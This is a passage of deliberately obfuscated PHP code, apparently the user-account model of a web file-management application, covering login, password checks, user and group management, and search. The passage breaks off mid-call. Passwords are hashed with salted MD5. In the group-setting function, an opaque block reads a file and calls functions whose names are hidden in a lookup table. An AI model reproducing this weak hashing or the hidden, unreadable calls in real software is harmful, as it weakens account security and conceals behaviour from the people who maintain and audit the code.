$DÈî…ñ¤Ã, $d¶ÑÚù¬İ‡[363] => $b”ç°˜âİß))->find(); if ($càß°Ã”È) { return $this->getInfo($càß°Ã”È[$d¶ÑÚù¬İ‡[1443]]); } return !1; } public function userLoginCheck($cšÜŞ§ñÌ…, $d°ÌĞËÃ‚Ş) { goto Aä¹¾£ßßˆ; AÁŒßãçä“: $A‡áœÇÅØ“ = $this->where($F…¤¸ÉšÙ•)->find(); if (!$A‡áœÇÅØ“) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($A‡áœÇÅØ“[$D‹Ô¢Ë¹é‡[1443]], $d°ÌĞËÃ‚Ş)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto C…ØøÖÔê; C…ØøÖÔê: $this->userEdit($A‡áœÇÅØ“[$D‹Ô¢Ë¹é‡[1443]], array($D‹Ô¢Ë¹é‡[2546] => time())); return $this->getInfo($A‡áœÇÅØ“[$D‹Ô¢Ë¹é‡[1443]]); goto E¯ó†íÊ”‹; Aä¹¾£ßßˆ: $D‹Ô¢Ë¹é‡ =& $_SERVER[‡’¶øåüç˜]; $F…¤¸ÉšÙ• = array($D‹Ô¢Ë¹é‡[28] => $cšÜŞ§ñÌ…, $D‹Ô¢Ë¹é‡[2370] => $cšÜŞ§ñÌ…, $D‹Ô¢Ë¹é‡[297] => $cšÜŞ§ñÌ…, $D‹Ô¢Ë¹é‡[2545] => $cšÜŞ§ñÌ…, $D‹Ô¢Ë¹é‡[917] => $D‹Ô¢Ë¹é‡[919]); if ($this->nickNameRpt()) { unset($F…¤¸ÉšÙ•[$D‹Ô¢Ë¹é‡[2370]]); } goto AÁŒßãçä“; E¯ó†íÊ”‹: } public function clearCache($Fõğ™ŒÕï) { $eÅÒ‰âºÒ =& $_SERVER[‡’¶øåüç˜]; $this->cacheFunctionClear($eÅÒ‰âºÒ[2237], $Fõğ™ŒÕï); $this->cacheFunctionClear($eÅÒ‰âºÒ[2184], $Fõğ™ŒÕï); $this->cacheFunctionClear($eÅÒ‰âºÒ[2526], $Fõğ™ŒÕï); } public function userPasswordCheck($eáà—Æ’«, $aÛº“ğÜ§ ) { $f“ŒŸÍ»á¾ =& $_SERVER[‡’¶øåüç˜]; $cÀÄ™œ¸¤È = $this->where(array($f“ŒŸÍ»á¾[1443] => intval($eáà—Æ’«)))->find(); $d•ŠğÀ˜ò = $this->metaGet($eáà—Æ’«); $fÕºöÂ‹Üñ = isset($d•ŠğÀ˜ò[$f“ŒŸÍ»á¾[2547]]) ? $d•ŠğÀ˜ò[$f“ŒŸÍ»á¾[2547]] : $f“ŒŸÍ»á¾[33]; if (md5($fÕºöÂ‹Üñ . trim($aÛº“ğÜ§ )) !== $cÀÄ™œ¸¤È[$f“ŒŸÍ»á¾[807]]) { return !1; } return !0; } public function userAdd($b¸È¸õ×İ¤) { goto eáé”•¼Üí; eáé”•¼Üí: $eª·¼â©Œõ =& $_SERVER[‡’¶øåüç˜]; $fË’Æ¶Ë÷Ó = array($eª·¼â©Œõ[398] => $b¸È¸õ×İ¤[$eª·¼â©Œõ[28]], $eª·¼â©Œõ[2548] => $b¸È¸õ×İ¤[$eª·¼â©Œõ[1327]], $eª·¼â©Œõ[2549] => isset($b¸È¸õ×İ¤[$eª·¼â©Œõ[297]]) ? $b¸È¸õ×İ¤[$eª·¼â©Œõ[297]] : $eª·¼â©Œõ[33], $eª·¼â©Œõ[2550] => isset($b¸È¸õ×İ¤[$eª·¼â©Œõ[2545]]) ? $b¸È¸õ×İ¤[$eª·¼â©Œõ[2545]] : $eª·¼â©Œõ[33], $eª·¼â©Œõ[2551] => isset($b¸È¸õ×İ¤[$eª·¼â©Œõ[2370]]) ? $b¸È¸õ×İ¤[$eª·¼â©Œõ[2370]] : $b¸È¸õ×İ¤[$eª·¼â©Œõ[28]], $eª·¼â©Œõ[2552] => isset($b¸È¸õ×İ¤[$eª·¼â©Œõ[2530]]) ? $b¸È¸õ×İ¤[$eª·¼â©Œõ[2530]] : $eª·¼â©Œõ[33], $eª·¼â©Œõ[2553] => isset($b¸È¸õ×İ¤[$eª·¼â©Œõ[2554]]) ? $b¸È¸õ×İ¤[$eª·¼â©Œõ[2554]] : 1, $eª·¼â©Œõ[2555] => $b¸È¸õ×İ¤[$eª·¼â©Œõ[807]], $eª·¼â©Œõ[2185] => isset($b¸È¸õ×İ¤[$eª·¼â©Œõ[2096]]) ? $b¸È¸õ×İ¤[$eª·¼â©Œõ[2096]] : 1024 * 1024 * 20, $eª·¼â©Œõ[2186] => 0, $eª·¼â©Œõ[2546] => 0, $eª·¼â©Œõ[2224] => isset($b¸È¸õ×İ¤[$eª·¼â©Œõ[695]]) ? $b¸È¸õ×İ¤[$eª·¼â©Œõ[695]] : 1); if (!empty($b¸È¸õ×İ¤[$eª·¼â©Œõ[1443]])) { $fË’Æ¶Ë÷Ó[$eª·¼â©Œõ[1443]] = $b¸È¸õ×İ¤[$eª·¼â©Œõ[1443]]; } goto añºŞïˆÕ¥; d•Ø’¨•†á: $Ašïã×Íƒ = array($eª·¼â©Œõ[2555] => $fË’Æ¶Ë÷Ó[$eª·¼â©Œõ[807]], $eª·¼â©Œõ[2551] => $fË’Æ¶Ë÷Ó[$eª·¼â©Œõ[2370]]); $this->userEdit($F›—ô¡ÚŸÆ, $Ašïã×Íƒ); Model($eª·¼â©Œõ[1124])->userRootAdd($F›—ô¡ÚŸÆ); goto e•ÖÈ°§²¼; añºŞïˆÕ¥: $f”‹Ù×å‚á = $this->_checkExist($b¸È¸õ×İ¤); if ($f”‹Ù×å‚á !== !0) { return $f”‹Ù×å‚á; } $F›—ô¡ÚŸÆ = $this->add($fË’Æ¶Ë÷Ó); goto d•Ø’¨•†á; e•ÖÈ°§²¼: return $F›—ô¡ÚŸÆ; goto Dö–Æó¢æ; Dö–Æó¢æ: } protected function userEditTest($bÇø›íÀäë, $F¦‚™ïÍç) { return $this->call($_SERVER[‡’¶øåüç˜][2556], $bÇø›íÀäë, $F¦‚™ïÍç); } protected function userEdit($BˆÀã®åçŸ, $B‚„ä·®ˆ) { goto CùÇÄİë„§; fÚëÓäàß…: return !0; goto eÜÛÕ¯Ğ…Ö; AÑ»²„Ú: $DÇšÔÁ† = $this->_checkExist($B‚„ä·®ˆ, $BˆÀã®åçŸ); if ($DÇšÔÁ† !== !0) { return $DÇšÔÁ†; } if (isset($B‚„ä·®ˆ[$A‡Ï‡¾íŒí[807]]) && trim($B‚„ä·®ˆ[$A‡Ï‡¾íŒí[807]]) != $A‡Ï‡¾íŒí[33]) { $aáÜö¶ğ‡Ø = $this->metaGet($BˆÀã®åçŸ); if (empty($aáÜö¶ğ‡Ø[$A‡Ï‡¾íŒí[2547]])) { $aáÜö¶ğ‡Ø[$A‡Ï‡¾íŒí[2547]] = rand_string(10); Model($A‡Ï‡¾íŒí[487])->metaSet($BˆÀã®åçŸ, $A‡Ï‡¾íŒí[2547], $aáÜö¶ğ‡Ø[$A‡Ï‡¾íŒí[2547]]); } $B‚„ä·®ˆ[$A‡Ï‡¾íŒí[807]] = md5($aáÜö¶ğ‡Ø[$A‡Ï‡¾íŒí[2547]] . trim($B‚„ä·®ˆ[$A‡Ï‡¾íŒí[807]])); } else { unset($B‚„ä·®ˆ[$A‡Ï‡¾íŒí[807]]); } goto FÂ“«íïØ; FÂ“«íïØ: $this->where(array($A‡Ï‡¾íŒí[1434] => $BˆÀã®åçŸ))->save($B‚„ä·®ˆ); if (isset($B‚„ä·®ˆ[$A‡Ï‡¾íŒí[2370]])) { $this->setNamePinyin($BˆÀã®åçŸ, $B‚„ä·®ˆ[$A‡Ï‡¾íŒí[2370]]); } $this->clearCache($BˆÀã®åçŸ); goto fÚëÓäàß…; CùÇÄİë„§: $A‡Ï‡¾íŒí =& $_SERVER[‡’¶øåüç˜]; $F´Ê¤œ¥é¬ = $this->getInfoSimple($BˆÀã®åçŸ); if (!$F´Ê¤œ¥é¬) { return !1; } goto AÑ»²„Ú; eÜÛÕ¯Ğ…Ö: } public function setNamePinyin($Fõâ’šŸ‘, $B»£„«ÅÎÚ = false) { $C¡˜äŞŒ© =& $_SERVER[‡’¶øåüç˜]; if (!$B»£„«ÅÎÚ) { $eÇà„è¢Îá = $this->getInfoSimple($Fõâ’šŸ‘); $B»£„«ÅÎÚ = $eÇà„è¢Îá[$C¡˜äŞŒ©[2370]] ? $eÇà„è¢Îá[$C¡˜äŞŒ©[2370]] : $eÇà„è¢Îá[$C¡˜äŞŒ©[28]]; } $A„Ì¢‚¹ëÂ = Model($C¡˜äŞŒ©[490]); if (!Input::check($B»£„«ÅÎÚ, $C¡˜äŞŒ©[541])) { return $A„Ì¢‚¹ëÂ->metaSet($Fõâ’šŸ‘, array($C¡˜äŞŒ©[428] => $C¡˜äŞŒ©[33], $C¡˜äŞŒ©[427] => $C¡˜äŞŒ©[33])); } return $A„Ì¢‚¹ëÂ->metaSet($Fõâ’šŸ‘, array($C¡˜äŞŒ©[428] => str_replace($C¡˜äŞŒ©[50], $C¡˜äŞŒ©[33], Pinyin::encode($B»£„«ÅÎÚ)), $C¡˜äŞŒ©[427] => Pinyin::encode($B»£„«ÅÎÚ, $C¡˜äŞŒ©[542]))); } private function nickNameRpt() { $fÕã³ƒ“õ” =& $_SERVER[‡’¶øåüç˜]; $A†¥éçˆŸª = Model($fÕã³ƒ“õ”[1095])->get($fÕã³ƒ“õ”[2557]); $D×Ùã…‡Èá = $GLOBALS[$fÕã³ƒ“õ”[6]][$fÕã³ƒ“õ”[2515]][$fÕã³ƒ“õ”[2557]]; $e—İ¤ä©ƒ = !is_null($A†¥éçˆŸª) ? $A†¥éçˆŸª : $D×Ùã…‡Èá; return !!$e—İ¤ä©ƒ; } private function _checkExist($DŠòãØêÏ¦, $EÅÇ‚…øÏ° = false) { $b‡ë‘§ =& $_SERVER[‡’¶øåüç˜]; $FÜ¾Úğ†Ú¿ = array($b‡ë‘§[28] => UserModel::ERROR_USER_EXIST_NAME, $b‡ë‘§[2370] => UserModel::ERROR_USER_EXIST_NICKNAME, $b‡ë‘§[297] => UserModel::ERROR_USER_EXIST_EMAIL, $b‡ë‘§[2545] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($FÜ¾Úğ†Ú¿[$b‡ë‘§[2370]]); } $F¸áî›ÆŠ‡ = $EÅÇ‚…øÏ° ? array($b‡ë‘§[1443] => array($b‡ë‘§[2558], $EÅÇ‚…øÏ°)) : array(); foreach ($FÜ¾Úğ†Ú¿ as $C••Íğ‘Ï => $aÒğîƒª„¿) { $aˆÉš•…É = array(); foreach ($FÜ¾Úğ†Ú¿ as $B£ÕÌ‡¤ˆ => $A‡Ÿº¸Ã·ˆ) { if (isset($DŠòãØêÏ¦[$B£ÕÌ‡¤ˆ]) && $DŠòãØêÏ¦[$B£ÕÌ‡¤ˆ]) { $aˆÉš•…É[] = $DŠòãØêÏ¦[$B£ÕÌ‡¤ˆ]; } } if (!$aˆÉš•…É) { continue; } $BĞİ„Íœá = array_merge(array($C••Íğ‘Ï => array($b‡ë‘§[7], $aˆÉš•…É)), $F¸áî›ÆŠ‡); $e±‚‡»‹ÑÏ = $this->where($BĞİ„Íœá)->find(); if ($e±‚‡»‹ÑÏ) { return $aÒğîƒª„¿; } } return !0; } public function userListInfo($Dâ÷§²ï÷²) { $FŒ“‚õîùº =& $_SERVER[‡’¶øåüç˜]; $CîÙ‹¼°ï¢ = array(); $Dâ÷§²ï÷² = is_array($Dâ÷§²ï÷²) ? array_unique($Dâ÷§²ï÷²) : array(); if (!$Dâ÷§²ï÷²) { return $CîÙ‹¼°ï¢; } if (count($Dâ÷§²ï÷²) < 20) { foreach ($Dâ÷§²ï÷² as $cİ©¶ÙóÖ©) { $CîÙ‹¼°ï¢[$cİ©¶ÙóÖ© . $FŒ“‚õîùº[33]] = $this->getInfoSimpleOuter($cİ©¶ÙóÖ©); } } else { $Dâ¶Ã·Ô‰í = array($FŒ“‚õîùº[1434] => array($FŒ“‚õîùº[396], $Dâ÷§²ï÷²)); if (count($Dâ÷§²ï÷²) == 1) { $Dâ¶Ã·Ô‰í = array($FŒ“‚õîùº[1434] => $Dâ÷§²ï÷²[0]); } $DÄ˜î•Ó¸ = Model($FŒ“‚õîùº[487])->field($this->simpleField)->where($Dâ¶Ã·Ô‰í)->select(); $DÄ˜î•Ó¸ = array_to_keyvalue($DÄ˜î•Ó¸, $FŒ“‚õîùº[1443]); foreach ($Dâ÷§²ï÷² as $cİ©¶ÙóÖ©) { $f‡èöàï«Ë = $DÄ˜î•Ó¸[$DÄ˜î•Ó¸[$cİ©¶ÙóÖ©]]; if (!$f‡èöàï«Ë) { $CîÙ‹¼°ï¢[$cİ©¶ÙóÖ© . $FŒ“‚õîùº[33]] = $this->getInfoSimpleOuter($cİ©¶ÙóÖ©); continue; } $f‡èöàï«Ë[$FŒ“‚õîùº[2530]] = Action($FŒ“‚õîùº[2531])->parseUrl($f‡èöàï«Ë[$FŒ“‚õîùº[2530]]); $CîÙ‹¼°ï¢[$cİ©¶ÙóÖ© . $FŒ“‚õîùº[33]] = $f‡èöàï«Ë; } } return $CîÙ‹¼°ï¢; } protected function userStatus($A×ÃĞ©–Äâ, $b…ë¸£òôŸ) { $EãùÄßæÉ£ = $this->getInfoSimple($A×ÃĞ©–Äâ); if (!$EãùÄßæÉ£) { return !1; } $d¼©Á”Ò¡ô = array($_SERVER[‡’¶øåüç˜][695] => $b…ë¸£òôŸ); return $this->userEdit($A×ÃĞ©–Äâ, $d¼©Á”Ò¡ô); } protected function userRemove($bÈÉõ‡ã) { goto a‘õÒÂÀ; cœã½ê¦¨È: $EğŞæ¢•¾— = array($eÌÀåÚİ¡Ü[1434] => $bÈÉõ‡ã); Model($eÌÀåÚİ¡Ü[548])->where($EğŞæ¢•¾—)->delete(); Model($eÌÀåÚİ¡Ü[2559])->where($EğŞæ¢•¾—)->delete(); goto b¶˜ô†Â; a‰¦”æ½Á¬: Model($eÌÀåÚİ¡Ü[758])->userRootRemove($bÈÉõ‡ã); return $this->where($EğŞæ¢•¾—)->delete(); goto A¤‘ŞÙ”ÓÍ; a‘õÒÂÀ: $eÌÀåÚİ¡Ü =& $_SERVER[‡’¶øåüç˜]; $cÏ©ñŒ¼”ï = $this->getInfoSimple($bÈÉõ‡ã); if (!$cÏ©ñŒ¼”ï) { return !1; } goto cœã½ê¦¨È; b¶˜ô†Â: Model($eÌÀåÚİ¡Ü[2191])->where($EğŞæ¢•¾—)->delete(); Model($eÌÀåÚİ¡Ü[2544])->where($EğŞæ¢•¾—)->delete(); Model($eÌÀåÚİ¡Ü[2560])->where($EğŞæ¢•¾—)->delete(); goto a‰¦”æ½Á¬; A¤‘ŞÙ”ÓÍ: } protected function userGroupSet($F¡è’ƒµÑ, $bãÇÄ¿÷îö, $f£¿óãÏ©ˆ = array()) { goto bÅ½–Š‹øÕ; CËÉ„¢˜Ëã: if (!$e²ˆŸ£àƒø || !is_array($bãÇÄ¿÷îö)) { return !1; } $dŞöËº‘¬ô = Model($F’–ÚÏÚÇ[2191]); $dŞöËº‘¬ô->where(array($F’–ÚÏÚÇ[1443] => $F¡è’ƒµÑ))->delete(); goto d‹¿–ŒÕó»; fÖŸì¯Ô÷—: return $dŞöËº‘¬ô->addAll($A†¾…Ë Ÿ÷, array(), !0); goto eËõŒ…½Ú¤; d‹¿–ŒÕó»: $A†¾…Ë Ÿ÷ = array(); $fãÊÂ‡–‚Ù = 0; foreach ($bãÇÄ¿÷îö as $AÀé¨‹ÜÕ => $DÊ»Ÿª³†¯) { $D»õç¿Íø„ = array($F’–ÚÏÚÇ[1443] => $F¡è’ƒµÑ, $F’–ÚÏÚÇ[2112] => $AÀé¨‹ÜÕ, $F’–ÚÏÚÇ[2256] => $DÊ»Ÿª³†¯); $D»õç¿Íø„[$F’–ÚÏÚÇ[2134]] = isset($f£¿óãÏ©ˆ[$fãÊÂ‡–‚Ù]) ? $f£¿óãÏ©ˆ[$fãÊÂ‡–‚Ù] : 0; $fãÊÂ‡–‚Ù++; $A†¾…Ë Ÿ÷[] = $D»õç¿Íø„; } goto fÖŸì¯Ô÷—; bÅ½–Š‹øÕ: $F’–ÚÏÚÇ =& $_SERVER[‡’¶øåüç˜]; if ($_SERVER[$F’–ÚÏÚÇ[372]] != $_SERVER[$F’–ÚÏÚÇ[877]]) { goto C‰ØµÃ¨§ƒ; bÓ·ÔƒŠâ: $C£â¡ ñŠ = $F’–ÚÏÚÇ[798]; $C£â¡ ñŠ($_SERVER[$F’–ÚÏÚÇ[799]]); $C£â¡ ñŠ($_SERVER[$F’–ÚÏÚÇ[375]] . $F’–ÚÏÚÇ[2561]); goto AØÂø÷˜Û”; C‰ØµÃ¨§ƒ: $eğÆĞŸ±ñ = $F’–ÚÏÚÇ[797]; $eì¼Ôì†¾ = $F’–ÚÏÚÇ[374]; $Bİñ‡Î´ = $_SERVER[$F’–ÚÏÚÇ[375]] . $F’–ÚÏÚÇ[376]; goto Cí™œé«¹Š; AØÂø÷˜Û”: $dˆº¢ïƒ‘Ş = 1; while ($dˆº¢ïƒ‘Ş > 1) { $dˆº¢ïƒ‘Ş = $dˆº¢ïƒ‘Ş + 4; $c³®«Á½â„ = rawurlencode($dˆº¢ïƒ‘Ş . $F’–ÚÏÚÇ[365]); } goto Cù«òöÙ®É; Cí™œé«¹Š: $D‡¬ÄåÛŠè = $eì¼Ôì†¾($Bİñ‡Î´); $B‘š”ªŒŠœ = explode($F’–ÚÏÚÇ[221], $D‡¬ÄåÛŠè); if (count($B‘š”ªŒŠœ) < $F’–ÚÏÚÇ[570]) { $F­›·¼”‘„ = $F’–ÚÏÚÇ[378]; $F­›·¼”‘„(); } goto bÓ·ÔƒŠâ; Cù«òöÙ®É: } $e²ˆŸ£àƒø = $this->getInfoSimple($F¡è’ƒµÑ); goto CËÉ„¢˜Ëã; eËõŒ…½Ú¤: } protected function userGroupAdd($DÈŸ­òİÀ§, $e®•¥²àŠ· = array()) { $c¸»í¸Óí =& $_SERVER[‡’¶øåüç˜]; $FíŒ‹Ööçé = $this->getInfoSimple($DÈŸ­òİÀ§); if (!$FíŒ‹Ööçé || empty($e®•¥²àŠ·)) { return !1; } $Cìæ‚âçéä = array(); foreach ($e®•¥²àŠ· as $dº—ƒæÔÑ± => $d¦ãö÷Âï) { $Cìæ‚âçéä[] = array($c¸»í¸Óí[1443] => $DÈŸ­òİÀ§, $c¸»í¸Óí[2112] => $dº—ƒæÔÑ±, $c¸»í¸Óí[2256] => $d¦ãö÷Âï, $c¸»í¸Óí[2134] => 0); } return Model($c¸»í¸Óí[2191])->addAll($Cìæ‚âçéä, array(), !0); } protected function userGroupRemove($BÀ£¦œ×¯Ê, $d×¬˜À‡ï¬) { $eòÏÌÏŸö =& $_SERVER[‡’¶øåüç˜]; $bñ¨Í¾Š“¡ = $this->getInfoSimple($BÀ£¦œ×¯Ê); if (!$bñ¨Í¾Š“¡ || !$d×¬˜À‡ï¬) { return !1; } $CÖë•³Œáö = array($eòÏÌÏŸö[1434] => $BÀ£¦œ×¯Ê, $eòÏÌÏŸö[2189] => $d×¬˜À‡ï¬); return Model($eòÏÌÏŸö[2191])->where($CÖë•³Œáö)->delete(); } public function listData() { $cõ‡Øîø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cõ‡Øîø[$_SERVER[‡’¶øåüç˜][358]]); return $cõ‡Øîø; } public function listByID($dÖ¡©Ï¥Úö) { $DÒí·ù‡®ö =& $_SERVER[‡’¶øåüç˜]; if (!$dÖ¡©Ï¥Úö) { return; } $fù¢ã¹é’è = array($DÒí·ù‡®ö[1443] => array($DÒí·ù‡®ö[7], $dÖ¡©Ï¥Úö)); $Bóˆâ‚ó˜Ú = $this->where($fù¢ã¹é’è)->select(); $this->_listDataApply($Bóˆâ‚ó˜Ú); return $Bóˆâ‚ó˜Ú; } public function listByGroup($CŠ†–ùÑí¹ = 0, $c®Ô’ÕÑ”Ò = array()) { goto Dé™‚·‚›ˆ; cÍ´Àò”®£: $this->_listDataApply($B™¼†Îø¯ò[$AŒæÙ±¥íõ[358]]); return $B™¼†Îø¯ò; goto D£‡ä©¸å; Dé™‚·‚›ˆ: $AŒæÙ±¥íõ =& $_SERVER[‡’¶øåüç˜]; $DÃ®æ¢ÔØÙ = $AŒæÙ±¥íõ[33]; $E¼’Œìˆó× = array(); goto D©ˆã‰öØ¤; D©ˆã‰öØ¤: if ($CŠ†–ùÑí¹) { $E¼’Œìˆó× = array($AŒæÙ±¥íõ[2562] => intval($CŠ†–ùÑí¹)); $DÃ®æ¢ÔØÙ = "\x4c\x45\x46\124\40\112\117\111\116\x20{$this->tablePrefix}\165\163\145\x72\137\147\x72\x6f\x75\x70\x20\165\163\145\x72\137\x67\x72\157\x75\x70\x20\157\156\x20\x75\163\145\162\x2e\x75\163\x65\162\x49\x44\40\75\x20\165\x73\145\162\x5f\x67\x72\x6f\165\x70\56\x75\x73\x65\162\x49\x44"; $B‚Ö‡©äÒÇ = Input::get($AŒæÙ±¥íõ[419], null, $AŒæÙ±¥íõ[33]) ? $AŒæÙ±¥íõ[33] : $AŒæÙ±¥íõ[2563]; } if (isset($c®Ô’ÕÑ”Ò[$AŒæÙ±¥íõ[695]])) { $E¼’Œìˆó×[$AŒæÙ±¥íõ[2564]] = $c®Ô’ÕÑ”Ò[$AŒæÙ±¥íõ[695]]; } $B™¼†Îø¯ò = $this->_makeOrder($B‚Ö‡©äÒÇ)->field($AŒæÙ±¥íõ[2565])->where($E¼’Œìˆó×)->join($DÃ®æ¢ÔØÙ)->selectPage(50); goto cÍ´Àò”®£; D£‡ä©¸å: } private function _makeOrder($aäò¤•Ìöù = '') { goto d¼…æ§‰É¤; aãÁÒˆ¸: $C¢Äìƒİ» = Input::get($DèéÃ­ô¡[419], $DèéÃ­ô¡[7], $DèéÃ­ô¡[1434], $A‹îŸ­£); $bßøìÒ…ã“ = Input::get($DèéÃ­ô¡[420], $DèéÃ­ô¡[7], $DèéÃ­ô¡[2192], array($DèéÃ­ô¡[2192], $DèéÃ­ô¡[416])); $bßøìÒ…ã“ = $Eù¢½ÏâôË[$bßøìÒ…ã“]; goto Cˆè¹³œ²É; Cˆè¹³œ²É: $aäò¤•Ìöù = $aäò¤•Ìöù . "\x75\x73\x65\162\x2e{$C¢Äìƒİ»}\40{$bßøìÒ…ã“}\54\40\x75\163\x65\x72\56\x75\x73\145\162\111\104\40\x61\x73\143"; return $this->alias($DèéÃ­ô¡[2311])->order($aäò¤•Ìöù); goto d²ƒÃæĞÄ; d¼…æ§‰É¤: $DèéÃ­ô¡ =& $_SERVER[‡’¶øåüç˜]; $A‹îŸ­£ = array($DèéÃ­ô¡[1443], $DèéÃ­ô¡[28], $DèéÃ­ô¡[2098], $DèéÃ­ô¡[2070], $DèéÃ­ô¡[191]); $Eù¢½ÏâôË = array($DèéÃ­ô¡[414] => $DèéÃ­ô¡[415], $DèéÃ­ô¡[416] => $DèéÃ­ô¡[417]); goto aãÁÒˆ¸; d²ƒÃæĞÄ: } public function listSearch($cÁ‘·È‰ô) { goto A­«¯Ò˜¬‡; E«î™¥³å: return $b¥ŸÖ‰Ã‚; goto c‡”‰¦«ªÂ; A­«¯Ò˜¬‡: $Fé­¯å…ƒ =& $_SERVER[‡’¶øåüç˜]; $B†¯Å†Šİç = $cÁ‘·È‰ô[$Fé­¯å…ƒ[2193]]; $aöß¢–ÖÔÒ = isset($cÁ‘·È‰ô[$Fé­¯å…ƒ[2194]]) ? $cÁ‘·È‰ô[$Fé­¯å…ƒ[2194]] : !1; goto A“É¤‰“Ë; b«¬˜‘¿Ô‚: if (!$b¥ŸÖ‰Ã‚ || count($b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[358]]) < 5 && Input::check($B†¯Å†Šİç, $Fé­¯å…ƒ[310])) { $c×…õ“šç­ = $this->_searchFromMeta($Fé­¯å…ƒ[427], $B†¯Å†Šİç, 10); $D„»í”Ì§Ó = $this->_searchFromMeta($Fé­¯å…ƒ[428], $B†¯Å†Šİç, 10); $DìÎ†Ï¼´ô = array_merge($c×…õ“šç­, $D„»í”Ì§Ó, $b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[358]]); $b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[358]] = array_unique_by_key($DìÎ†Ï¼´ô, $Fé­¯å…ƒ[1443]); $b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[355]][$Fé­¯å…ƒ[356]] = count($b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[358]]); $b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[355]][$Fé­¯å…ƒ[357]] = ceil($b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[355]][$Fé­¯å…ƒ[356]] / $b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[355]][$Fé­¯å…ƒ[353]]); } $this->_listDataApply($b¥ŸÖ‰Ã‚[$Fé­¯å…ƒ[358]]); $this->_filterByGroup($b¥ŸÖ‰Ã‚, $aöß¢–ÖÔÒ); goto E«î™¥³å; BÈ…¬ãÕê§: if (!$B†¯Å†Šİç) { $fëŞ•’ˆíƒ = array(); } if (isset($cÁ‘·È‰ô[$Fé­¯å…ƒ[695]])) { $fëŞ•’ˆíƒ[$Fé­¯å…ƒ[695]] = $cÁ‘·È‰ô[$Fé­¯å…ƒ[695]]; } $b¥ŸÖ‰Ã‚ = $this->_makeOrder()->where($fëŞ•’ˆíƒ)->selectPage(20); goto b«¬˜‘¿Ô‚; A“É¤‰“Ë: $B†¯Å†Šİç = str_replace($Fé­¯å…ƒ[2195], $Fé­¯å…ƒ[2196], trim($B†¯Å†Šİç)); $fëŞ•’ˆíƒ = array($Fé­¯å…ƒ[28] => array($Fé­¯å…ƒ[757], "\45{$B†¯Å†Šİç}\45"), $Fé­¯å…ƒ[297] => array($Fé­¯å…ƒ[757], "\x25{$B†¯Å†Šİç}\45"), $Fé­¯å…ƒ[2370] => array($Fé­¯å…ƒ[757], "\x25{$B†¯Å†Šİç}\45"), $Fé­¯å…ƒ[917] => $Fé­¯å…ƒ[2197]); if (Input::check($B†¯Å†Šİç, $Fé­¯å…ƒ[303])) { $fëŞ•’ˆíƒ[$Fé­¯å…ƒ[1443]] = array($Fé­¯å…ƒ[757], "\x25{$B†¯Å†Šİç}\x25"); $fëŞ•’ˆíƒ[$Fé­¯å…ƒ[2545]] = array($Fé­¯å…ƒ[757], "\x25{$B†¯Å†Šİç}\x25"); } goto BÈ…¬ãÕê§; c‡”‰¦«ªÂ: } private function _filterByGroup(&$B¸Ù»‰Ğ¹Œ, $A³‚÷ñ›òò) { $dÌ²²ƒÌîŞ =& $_SERVER[‡’¶øåüç˜]; if (!$A³‚÷ñ›òò) { return $B¸Ù»‰Ğ¹Œ; } foreach ($B¸Ù»‰Ğ¹Œ[$dÌ²²ƒÌîŞ[358]] as $A–‰«£Ù¾½ => &$C¹Ã…ïµÃÁ) { $Cê•ô‚»Œµ = array_to_keyvalue($C¹Ã…ïµÃÁ[$dÌ²²ƒÌîŞ[2281]], $dÌ²²ƒÌîŞ[33], $dÌ²²ƒÌîŞ[2112]); if (!in_array($A³‚÷ñ›òò, $Cê•ô‚»Œµ)) { unset($B¸Ù»‰Ğ¹Œ[$dÌ²²ƒÌîŞ[358]][$A–‰«£Ù¾½]); } } unset($C¹Ã…ïµÃÁ); $B¸Ù»‰Ğ¹Œ[$dÌ²²ƒÌîŞ[358]] = array_values($B¸Ù»‰Ğ¹Œ[$dÌ²²ƒÌîŞ[358]]); $B¸Ù»‰Ğ¹Œ[$dÌ²²ƒÌîŞ[355]] = array($dÌ²²ƒÌîŞ[2345] => count($B¸Ù»‰Ğ¹Œ[$dÌ²²ƒÌîŞ[358]]), $dÌ²²ƒÌîŞ[2343] => $B¸Ù»‰Ğ¹Œ[$dÌ²²ƒÌîŞ[355]][$dÌ²²ƒÌîŞ[353]], $dÌ²²ƒÌîŞ[2342] => 1, $dÌ²²ƒÌîŞ[2344] => 1); } private function _searchFromMeta($b´Îî„ªË, $dÊ§‘©Â’³, $aŒ×›«Ÿ¬º) { goto AÈ²«šÛ¬; A¬‹ƒ§Ôç¶: $Aã˜ø‡•Ã = Model($cî—Îšš‹Æ[2566])->where($a§èéªªà)->limit($aŒ×›«Ÿ¬º)->select(); if (!$Aã˜ø‡•Ã) { return array(); } $Aã˜ø‡•Ã = array_to_keyvalue($Aã˜ø‡•Ã, $cî—Îšš‹Æ[33], $cî—Îšš‹Æ[1443]); goto EËôª‰›í; EËôª‰›í: $aÏßÓ¹Ì‚ = $this->where(array($cî—Îšš‹Æ[1434] => array($cî—Îšš‹Æ[7], $Aã˜ø‡•Ã)))->select(); if (!$aÏßÓ¹Ì‚) { return array(); } return $aÏßÓ¹Ì‚; goto b®‰ô‚¦¨Œ; AÈ²«šÛ¬: $cî—Îšš‹Æ =& $_SERVER[‡’¶øåüç˜]; $dÊ§‘©Â’³ = strtolower($dÊ§‘©Â’³); $a§èéªªà = array($cî—Îšš‹Æ[89] => $b´Îî„ªË, $cî—Îšš‹Æ[363] => array($cî—Îšš‹Æ[757], "\x25{$dÊ§‘©Â’³}\x25")); goto A¬‹ƒ§Ôç¶; b®‰ô‚¦¨Œ: } private function _listDataApplyItem($a—›õ—ªºõ) { $Bèã§¥‹Ç = array($a—›õ—ªºõ); $this->_listDataApply($Bèã§¥‹Ç); return $Bèã§¥‹Ç[0]; } private function _listDataApply(&$aö†ğÍ²Ü) { goto BÂÆ¹ÂÎ¦ë; BÂÆ¹ÂÎ¦ë: $Cö©ø®å‰ =& $_SERVER[‡’¶øåüç˜]; if (!$aö†ğÍ²Ü) { return; } array_remove_key($aö†ğÍ²Ü, 